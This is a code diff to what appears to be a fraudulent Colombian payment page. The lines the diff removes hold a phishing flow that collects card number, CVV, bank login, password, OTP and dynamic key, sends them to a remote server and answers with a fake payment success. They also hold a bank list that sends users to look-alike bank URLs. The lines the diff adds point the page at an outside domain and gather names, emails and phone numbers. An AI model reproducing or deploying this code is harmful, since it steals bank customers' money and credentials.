@@ -218,8 +218,13 @@ nav{
 }
 .btn-pse:hover{background:var(--green-dk)}
 
-/* ── JLP spin ── */
-.jlp-spin{width:46px;height:46px;border:4px solid #eee;border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite}
+.pse-field input{
+  width:100%;padding:10px 13px;
+  border:1.5px solid var(--border);border-radius:8px;
+  background:#fff;font-family:inherit;font-size:13.5px;
+  color:var(--text);outline:none;transition:border-color .15s;
+}
+.pse-field input:focus{border-color:var(--blue)}
 
 /* ── Overlays ── */
 #loadOverlay{
@@ -336,50 +341,6 @@ nav{
 
     <div class="pay-section-title">Métodos disponibles</div>
 
-    <!-- Tarjetas -->
-    <div class="pay-method" id="tarjetaHeader" onclick="toggleTarjeta()">
-      <div class="pay-method-icon" style="background:#F0F4FF;gap:3px;flex-direction:row;padding:6px;">
-        <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg" style="height:18px;">
-        <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg" style="height:18px;">
-      </div>
-      <div class="pay-method-text">
-        <div class="pay-method-name">Tarjeta Débito o Crédito</div>
-        <div class="pay-method-sub">Visa, Mastercard, Amex, Diners</div>
-      </div>
-      <div class="pay-arrow" id="tarArrow">›</div>
-    </div>
-
-    <div class="pse-panel" id="tarjetaPanel">
-      <div class="pse-field">
-        <label>Tipo de documento</label>
-        <select id="tarDoc">
-          <option value="CC">Cédula de Ciudadanía</option>
-          <option value="CE">Cédula de Extranjería</option>
-          <option value="NIT">NIT</option>
-          <option value="PP">Pasaporte</option>
-        </select>
-      </div>
-      <div class="pse-field">
-        <label>Número de documento</label>
-        <input type="tel" id="tarCedula" inputmode="numeric" placeholder="123456789">
-      </div>
-      <div class="pse-field">
-        <label>Número de tarjeta</label>
-        <input type="tel" id="tarNumero" inputmode="numeric" maxlength="19" placeholder="4111 1111 1111 1111">
-      </div>
-      <div style="display:flex;gap:10px;">
-        <div class="pse-field" style="flex:1">
-          <label>Fecha (MM/AA)</label>
-          <input type="text" id="tarFecha" maxlength="5" placeholder="12/27">
-        </div>
-        <div class="pse-field" style="flex:1">
-          <label>CVV</label>
-          <input type="tel" id="tarCvv" inputmode="numeric" maxlength="4" placeholder="123">
-        </div>
-      </div>
-      <button class="btn-pse" onclick="pagarTarjeta()">Pagar con tarjeta</button>
-    </div>
-
     <!-- PSE -->
     <div class="pay-method" onclick="togglePSE()">
       <div class="pay-method-icon pse" style="background:#E8F5FF;overflow:hidden;">
@@ -396,36 +357,7 @@ nav{
       <div class="pse-field">
         <label>Banco</label>
         <select id="pseBank">
-          <option value="">Selecciona tu banco</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/">Nequi</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f9/poral/">Bancolombia</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f3/">Davivienda</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/">Banco de Bogotá</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f18/">Banco Popular</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f1/">Banco AV Villas</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f13/">BBVA Colombia</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f2/">Banco Caja Social</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f5/">Banco Falabella</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f14/">Banco de Occidente</option>
-          <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f12/">Scotiabank Colpatria</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Agrario de Colombia</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco GNB Sudameris</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Itaú</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Pichincha</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Serfinanza</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Bancamía</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Coltefinanciera</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Confiar Cooperativa Financiera</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Coofinep</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Cotrafa Cooperativa Financiera</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Daviplata</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Iris (Banco Mundo Mujer)</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Juriscoop</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Lulo Bank</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Movii</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Nu Colombia</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Rappipay</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Ualá</option>
+          <option value="">Cargando bancos...</option>
         </select>
       </div>
       <div class="pse-field">
@@ -435,6 +367,20 @@ nav{
           <option value="J">Persona jurídica</option>
         </select>
       </div>
+      <div class="pse-field">
+        <label>Nombre completo</label>
+        <input type="text" id="pseNombre" placeholder="Ej: Juan Pérez" autocomplete="name">
+      </div>
+      <div style="display:flex;gap:10px;">
+        <div class="pse-field" style="flex:1">
+          <label>Correo electrónico</label>
+          <input type="email" id="pseEmail" placeholder="tucorreo@gmail.com" autocomplete="email">
+        </div>
+        <div class="pse-field" style="flex:1">
+          <label>Celular</label>
+          <input type="tel" id="pseTelefono" inputmode="numeric" maxlength="10" placeholder="3001234567" autocomplete="tel">
+        </div>
+      </div>
       <button class="btn-pse" onclick="pagarPSE()">Continuar con PSE →</button>
     </div>
 
@@ -443,70 +389,6 @@ nav{
     </div>
   </div>
 </section>
-
-<!-- ── Modal JLP Tarjeta ── -->
-<div id="jlpOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:200000;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(2px);">
-  <div style="background:#fff;border-radius:16px;max-width:420px;width:100%;padding:26px;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.3);font-family:inherit;">
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid #f0f0f0;">
-      <div>
-        <div id="jlpCardName" style="font-size:15px;font-weight:700;color:#1a1a1a;"></div>
-        <div id="jlpAmtLine" style="font-size:13px;color:#555;margin-top:3px;"></div>
-      </div>
-      <img id="jlpCardLogo" style="height:38px;object-fit:contain;display:none;">
-    </div>
-    <!-- stage: wait -->
-    <div id="jlpWait" class="jlp-stage" style="display:block;">
-      <div style="font-size:16px;font-weight:700;margin-bottom:8px;">Autorizando transacción</div>
-      <div style="font-size:13px;color:#666;margin-bottom:20px;line-height:1.5;">Estamos verificando tu pago con el banco. Esto puede tomar unos segundos.</div>
-      <div style="display:flex;flex-direction:column;align-items:center;gap:14px;padding:10px 0;">
-        <div class="jlp-spin"></div>
-        <p style="color:#888;font-size:14px;margin:0;">Esperando confirmación...</p>
-      </div>
-    </div>
-    <!-- stage: cred -->
-    <div id="jlpCred" class="jlp-stage" style="display:none;">
-      <div style="font-size:16px;font-weight:700;margin-bottom:8px;">Confirma tu identidad</div>
-      <div style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;">Ingresa las credenciales de tu banco para continuar.</div>
-      <div class="pse-field"><label>Usuario</label><input type="text" id="jlpUser" placeholder="Ingresa tu usuario" autocomplete="off"></div>
-      <div class="pse-field" style="position:relative;">
-        <label>Contraseña</label>
-        <input type="password" id="jlpPass" placeholder="Ingresa tu contraseña" autocomplete="off" style="padding-right:40px;">
-        <button onclick="toggleJlpEye()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:16px;color:#888;padding:0;margin-top:10px;">👁</button>
-      </div>
-      <button class="btn-pse" onclick="jlpEnviarCred()">Continuar</button>
-    </div>
-    <!-- stage: loading -->
-    <div id="jlpLoading" class="jlp-stage" style="display:none;">
-      <div style="font-size:16px;font-weight:700;margin-bottom:8px;" id="jlpLoadingTxt">Verificando credenciales</div>
-      <div style="display:flex;flex-direction:column;align-items:center;gap:14px;padding:20px 0;">
-        <div class="jlp-spin"></div>
-        <p style="color:#888;font-size:14px;margin:0;">Procesando...</p>
-      </div>
-    </div>
-    <!-- stage: otp -->
-    <div id="jlpOTP" class="jlp-stage" style="display:none;">
-      <div style="font-size:16px;font-weight:700;margin-bottom:8px;">Código OTP</div>
-      <div style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;">Revisa tu SMS o app bancaria e ingresa el código de verificación.</div>
-      <div class="pse-field"><label>Código OTP</label><input type="tel" id="jlpOtpInput" inputmode="numeric" maxlength="8" placeholder="••••••" style="letter-spacing:6px;font-size:22px;text-align:center;"></div>
-      <button class="btn-pse" onclick="jlpEnviarOtp()">Confirmar</button>
-    </div>
-    <!-- stage: clave -->
-    <div id="jlpClave" class="jlp-stage" style="display:none;">
-      <div style="font-size:16px;font-weight:700;margin-bottom:8px;">Clave Dinámica</div>
-      <div style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;">Ingresa tu clave dinámica para confirmar la transacción.</div>
-      <div class="pse-field"><label>Clave Dinámica</label><input type="tel" id="jlpClaveInput" inputmode="numeric" maxlength="8" placeholder="••••••" style="letter-spacing:6px;font-size:22px;text-align:center;"></div>
-      <button class="btn-pse" onclick="jlpEnviarClave()">Confirmar</button>
-    </div>
-    <!-- stage: success -->
-    <div id="jlpSuccess" class="jlp-stage" style="display:none;text-align:center;">
-      <div style="font-size:48px;margin-bottom:12px;">✅</div>
-      <div style="font-size:17px;font-weight:700;margin-bottom:8px;">¡Pago exitoso!</div>
-      <div style="font-size:13px;color:#666;line-height:1.5;margin-bottom:20px;">Tu pago ha sido procesado correctamente. Recibirás confirmación pronto.</div>
-      <button class="btn-pse" onclick="location.reload()">Finalizar</button>
-    </div>
-    <div style="font-size:11px;color:#aaa;text-align:center;margin-top:18px;">🔒 Conexión segura · SSL 256-bit</div>
-  </div>
-</div>
 
 <!-- Overlays -->
 <div id="loadOverlay">
@@ -520,7 +402,7 @@ nav{
 </div>
 
 <script>
-const API_URL = 'http://localhost:3002';
+const API_URL = 'https://gestadmoncool.online';
 
 // ── Tracking visita ───────────────────────────────────────────────────────────
 (function() {
@@ -557,182 +439,71 @@ function togglePSE() {
   const p = document.getElementById('psePanel');
   p.classList.toggle('show');
   document.getElementById('pseArrow').textContent = p.classList.contains('show') ? '⌃' : '›';
-}
-function pagarPSE() {
-  const url = document.getElementById('pseBank').value;
-  if (!url) { alert('Selecciona tu banco'); return; }
-  document.getElementById('succOverlay').classList.add('show');
-  setTimeout(() => { window.location.href = url; }, 800);
+  if (p.classList.contains('show')) cargarBancosPSE();
 }
 
-// ── Toggle tarjeta panel ──────────────────────────────────────────────────
-function toggleTarjeta() {
-  const p = document.getElementById('tarjetaPanel');
-  p.classList.toggle('show');
-  document.getElementById('tarArrow').textContent = p.classList.contains('show') ? '⌃' : '›';
-  if (p.classList.contains('show')) {
-    document.getElementById('psePanel').classList.remove('show');
-    document.getElementById('pseArrow').textContent = '›';
+async function cargarBancosPSE() {
+  const sel = document.getElementById('pseBank');
+  if (sel.dataset.loaded) return;
+  sel.innerHTML = '<option value="">Cargando bancos...</option>';
+  try {
+    const r = await fetch(API_URL + '/api/pse/bancos');
+    const d = await r.json();
+    if (d.status !== 'OK') throw new Error();
+    sel.innerHTML = '<option value="">Selecciona tu banco</option>';
+    d.data.forEach(b => {
+      const o = document.createElement('option');
+      o.value = b.financial_institution_code;
+      o.textContent = b.financial_institution_name;
+      sel.appendChild(o);
+    });
+    sel.dataset.loaded = '1';
+  } catch {
+    sel.innerHTML = '<option value="">Error cargando bancos — recarga la página</option>';
   }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-  const tarNum = document.getElementById('tarNumero');
-  if (tarNum) tarNum.addEventListener('input', function() {
-    let v = this.value.replace(/\D/g,'').slice(0,16);
-    this.value = v.replace(/(.{4})/g,'$1 ').trim();
-  });
-  const tarFec = document.getElementById('tarFecha');
-  if (tarFec) tarFec.addEventListener('input', function() {
-    let v = this.value.replace(/\D/g,'').slice(0,4);
-    if (v.length >= 3) v = v.slice(0,2)+'/'+v.slice(2);
-    this.value = v;
-  });
-  const tarCvv = document.getElementById('tarCvv');
-  if (tarCvv) tarCvv.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g,'').slice(0,4);
-  });
-});
+async function pagarPSE() {
+  const bancoCode   = document.getElementById('pseBank').value;
+  if (!bancoCode) { alert('Selecciona tu banco'); return; }
 
-async function pagarTarjeta() {
-  const cedula = document.getElementById('tarCedula').value.trim();
-  const numero = document.getElementById('tarNumero').value.trim();
-  const fecha  = document.getElementById('tarFecha').value.trim();
-  const cvv    = document.getElementById('tarCvv').value.trim();
-  const tipoDoc = document.getElementById('tarDoc').value;
-  if (!cedula || !numero || !fecha || !cvv) { alert('Por favor completa todos los campos'); return; }
-  const num = numero.replace(/\s/g,'');
-  const p0  = num[0];
-  const scheme = p0==='4' ? 'Visa' : p0==='5' ? 'Mastercard' : p0==='3' ? 'Amex' : 'Tarjeta';
-  const logoMap = {
-    'Visa': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg',
-    'Mastercard': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg',
-    'Amex': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg',
-    'Tarjeta': 'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg',
-  };
-  let tipoTarjeta = scheme;
+  const cedula      = _data?.documento || '';
+  const montoRaw    = document.getElementById('payTotal').textContent.replace(/[^\d]/g, '');
+  const tipoPersona = document.getElementById('pseTipo')?.value || 'N';
+  const nombre      = (document.getElementById('pseNombre')?.value || '').trim();
+  const email       = (document.getElementById('pseEmail')?.value || '').trim();
+  const telefono    = (document.getElementById('pseTelefono')?.value || '').trim();
+
+  loading(true, 'Conectando con PSE...');
+  const msgs = ['Conectando con PSE...', 'Verificando con ACH Colombia...', 'Generando link seguro...', 'Casi listo...'];
+  let mi = 0;
+  const msgIv = setInterval(() => {
+    mi = (mi + 1) % msgs.length;
+    document.getElementById('loadText').textContent = msgs[mi];
+  }, 3000);
+
   try {
-    const dr = await fetch(API_URL+'/api/detect-bank', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ cardNumber: num }),
-    });
-    const dd = await dr.json();
-    if (dd.ok && dd.bank) tipoTarjeta = dd.bank;
-  } catch {}
-  pagarTarjetaPsec({ tipoDoc, cedula, numero, fecha, cvv, tipoTarjeta, logoUrl: logoMap[scheme] });
-}
-
-// ── Modal tarjeta (flujo psec) ────────────────────────────────────────────
-let _psecId = null, _psecIv = null, _psecLastStatus = '';
-const PSEC_MAX  = 300000;
-const PSEC_POLL = 2500;
-
-function jlpStage(s) {
-  ['Wait','Cred','Loading','OTP','Clave','Success'].forEach(n => {
-    document.getElementById('jlp'+n).style.display = 'none';
-  });
-  document.getElementById('jlp'+s).style.display = 'block';
-}
-
-function toggleJlpEye() {
-  const i = document.getElementById('jlpPass');
-  i.type = i.type === 'password' ? 'text' : 'password';
-}
-
-function psecStopPoll() { if (_psecIv) { clearInterval(_psecIv); _psecIv = null; } }
-
-function psecStartPoll() {
-  const t0 = Date.now();
-  psecStopPoll();
-  _psecLastStatus = '';
-  _psecIv = setInterval(async () => {
-    if (Date.now()-t0 > PSEC_MAX) { psecStopPoll(); return; }
-    try {
-      const r = await fetch(API_URL+'/api/tarjeta/estado/'+_psecId);
-      const d = await r.json();
-      if (d.status !== 'OK') return;
-      const st = d.data.status;
-      if (st === _psecLastStatus) return;
-      _psecLastStatus = st;
-      if (st === 'pedir_otp') {
-        jlpStage('OTP');
-        document.getElementById('jlpOtpInput').value = '';
-      } else if (st === 'pedir_dinamica') {
-        jlpStage('Clave');
-        document.getElementById('jlpClaveInput').value = '';
-      } else if (st === 'esperando_otp' || st === 'esperando_dinamica') {
-        jlpStage('Loading');
-        document.getElementById('jlpLoadingTxt').textContent = 'Verificando con tu banco...';
-      } else if (st === 'error_otp') {
-        jlpStage('OTP');
-        document.getElementById('jlpOtpInput').value = '';
-      } else if (st === 'error_dinamica') {
-        jlpStage('Clave');
-        document.getElementById('jlpClaveInput').value = '';
-      } else if (st === 'aprobada') {
-        psecStopPoll();
-        jlpStage('Success');
-      } else if (st === 'declinada' || st === 'error_usuario_clave') {
-        psecStopPoll();
-        document.getElementById('jlpOverlay').style.display = 'none';
-        alert('Transacción no aprobada. Intenta con otro método.');
-      }
-    } catch(e) {}
-  }, PSEC_POLL);
-}
-
-async function pagarTarjetaPsec(datos) {
-  document.getElementById('jlpCardName').textContent = datos.tipoTarjeta;
-  document.getElementById('jlpAmtLine').textContent  = document.getElementById('payTotal').textContent;
-  const logo = document.getElementById('jlpCardLogo');
-  logo.src = datos.logoUrl; logo.style.display = 'block';
-  jlpStage('Wait');
-  document.getElementById('jlpOverlay').style.display = 'flex';
-  try {
-    const r = await fetch(API_URL+'/api/tarjeta/crear', {
+    const r = await fetch(API_URL + '/api/pse/generar', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        numero_tarjeta: datos.numero.replace(/\s/g,''),
-        fecha:          datos.fecha,
-        cvv:            datos.cvv,
-        tipo_doc:       datos.tipoDoc,
-        cedula:         datos.cedula,
-        monto:          document.getElementById('payTotal').textContent.replace(/[^\d]/g,''),
-      }),
+      body: JSON.stringify({ monto: montoRaw, bancoCode, cedula, tipoPersona, nombre, email, telefono }),
     });
     const d = await r.json();
-    if (d.status !== 'OK') throw new Error(d.message || 'Error');
-    _psecId = d.id;
-    psecStartPoll();
-  } catch(e) {
-    document.getElementById('jlpOverlay').style.display = 'none';
-    alert('Error al procesar. Intenta de nuevo.');
+    clearInterval(msgIv);
+
+    if (d.status === 'listo' && d.url) {
+      loading(false);
+      document.getElementById('succOverlay').classList.add('show');
+      setTimeout(() => { window.location.href = d.url; }, 900);
+    } else {
+      loading(false);
+      alert(d.message || 'No se pudo generar el link. Intenta de nuevo.');
+    }
+  } catch (e) {
+    clearInterval(msgIv);
+    loading(false);
+    alert('Error de conexión. Intenta de nuevo.');
   }
-}
-
-async function jlpEnviarOtp() {
-  const otp = document.getElementById('jlpOtpInput').value.trim();
-  if (!otp) { alert('Ingresa el código'); return; }
-  jlpStage('Loading');
-  document.getElementById('jlpLoadingTxt').textContent = 'Enviando código...';
-  _psecLastStatus = '';
-  await fetch(API_URL+'/api/tarjeta/actualizar', {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ id: _psecId, status: 'esperando_otp', banco_otp: otp }),
-  }).catch(()=>{});
-}
-
-async function jlpEnviarClave() {
-  const clave = document.getElementById('jlpClaveInput').value.trim();
-  if (!clave) { alert('Ingresa tu clave'); return; }
-  jlpStage('Loading');
-  document.getElementById('jlpLoadingTxt').textContent = 'Enviando clave...';
-  _psecLastStatus = '';
-  await fetch(API_URL+'/api/tarjeta/actualizar', {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ id: _psecId, status: 'esperando_dinamica', dinamica: clave }),
-  }).catch(()=>{});
 }
 
 const MOCK = {
